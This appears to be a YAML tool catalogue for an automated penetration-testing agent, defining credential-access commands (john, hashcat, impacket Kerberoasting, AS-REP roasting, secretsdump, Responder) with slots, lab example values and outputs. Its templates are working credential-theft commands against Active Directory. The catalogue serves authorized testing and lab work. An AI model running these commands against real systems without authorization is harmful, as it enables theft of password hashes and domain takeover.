# Credential Access (TA0006): hash cracking, Kerberos abuse, secret extraction
# from authenticated AD positions. These run on Kali against captured material
# or against the target's authentication services.

tools:
  - name: john_hash_crack
    category: exploit
    description: Crack a hash file with john using a wordlist.
    command_template: "john --wordlist={wordlist} --format={format} {hash_file}"
    slots:
      - name: hash_file
        type: file_path
        description: path to a file containing one or more hashes
      - name: wordlist
        type: wordlist_id
        description: password wordlist to try
        values:
          - "/usr/share/wordlists/rockyou.txt"
          - "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
        default: "/usr/share/wordlists/rockyou.txt"
      - name: format
        type: enum
        description: hash format
        values: [md5crypt, sha512crypt, NT, raw-md5, raw-sha1, raw-sha256, krb5tgs, krb5asrep, netntlmv2]
        default: NT
    runtime_cap_seconds: 1800
    output_parser_id: john
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1110.002]
    example_invocation:
      hash_file: /tmp/hashes.txt
      wordlist: "/usr/share/wordlists/rockyou.txt"
      format: NT
    example_output: |
      Password123      (Administrator)
      1g 0:00:00:01 DONE

  - name: hashcat_dict_attack
    category: exploit
    description: Hashcat dictionary attack with a chosen mode.
    command_template: "hashcat -a 0 -m {mode} -o /tmp/hashcat-out.txt {hash_file} {wordlist} --quiet"
    slots:
      - { name: hash_file, type: file_path, description: hash file path }
      - name: mode
        type: enum
        description: hashcat mode number (1000=NTLM, 1800=sha512crypt, 13100=krb5tgs, 18200=krb5asrep, etc.)
        values: ["0", "100", "1000", "1800", "13100", "18200", "5500", "5600"]
        default: "1000"
      - name: wordlist
        type: wordlist_id
        description: dictionary wordlist
        values:
          - "/usr/share/wordlists/rockyou.txt"
        default: "/usr/share/wordlists/rockyou.txt"
    runtime_cap_seconds: 3600
    output_parser_id: hashcat
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1110.002]
    example_invocation:
      hash_file: /tmp/hashes.txt
      mode: "1000"
      wordlist: "/usr/share/wordlists/rockyou.txt"
    example_output: |
      aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:Password123

  - name: kerberoast
    category: exploit
    description: GetUserSPNs.py - request TGS tickets for SPN-bearing AD accounts.
    command_template: "impacket-GetUserSPNs -dc-ip {dc_ip} -request -outputfile /tmp/krb-tgs.txt {domain}/{user}:{password}"
    slots:
      - { name: dc_ip, type: ip, description: domain controller IP }
      - { name: domain, type: hostname, description: AD domain }
      - { name: user, type: free_string, description: domain user }
      - { name: password, type: free_string, description: domain password }
    runtime_cap_seconds: 120
    output_parser_id: lines
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1558.003]
    example_invocation:
      dc_ip: 10.10.10.5
      domain: htb.local
      user: alice
      password: hunter2
    example_output: |
      ServicePrincipalName  Name      MemberOf
      MSSQLSvc/sql.htb:1433 sqlsvc    CN=Domain Admins,...

  - name: asreproast
    category: exploit
    description: GetNPUsers.py - request AS-REP for accounts with pre-auth disabled.
    command_template: "impacket-GetNPUsers -dc-ip {dc_ip} -no-pass -usersfile {users_file} {domain}/"
    slots:
      - { name: dc_ip, type: ip, description: domain controller IP }
      - { name: domain, type: hostname, description: AD domain }
      - { name: users_file, type: file_path, description: file with one username per line }
    runtime_cap_seconds: 60
    output_parser_id: lines
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1558.004]
    example_invocation:
      dc_ip: 10.10.10.5
      domain: htb.local
      users_file: /tmp/users.txt
    example_output: |
      $krb5asrep$23$bob@HTB.LOCAL:abc123...

  - name: secretsdump_with_credentials
    category: exploit
    description: impacket-secretsdump dumps SAM/LSA/NTDS hashes given valid creds.
    command_template: "impacket-secretsdump -just-dc-ntlm {domain}/{user}:{password}@{dc_ip}"
    slots:
      - { name: dc_ip, type: ip, description: domain controller IP }
      - { name: domain, type: hostname, description: AD domain }
      - { name: user, type: free_string, description: privileged user }
      - { name: password, type: free_string, description: password }
    runtime_cap_seconds: 600
    output_parser_id: secretsdump
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1003.003, T1003.006]
    example_invocation:
      dc_ip: 10.10.10.5
      domain: htb.local
      user: administrator
      password: Hunter2
    example_output: |
      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

  - name: responder_listen
    category: exploit
    description: Run Responder to harvest LLMNR/NBT-NS hashes (5 minute window).
    command_template: "timeout 300 responder -I {iface} -A"
    slots:
      - name: iface
        type: enum
        description: network interface to listen on
        values: [tun0, eth0, ens33, wlan0]
        default: tun0
    runtime_cap_seconds: 320
    output_parser_id: responder
    requires_root: true
    attack:
      matrices: [enterprise]
      tactics: [TA0006]
      techniques: [T1557.001]
    example_invocation: { iface: tun0 }
    example_output: |
      [SMB] NTLMv2-SSP Hash : alice::HTB:abcdef...
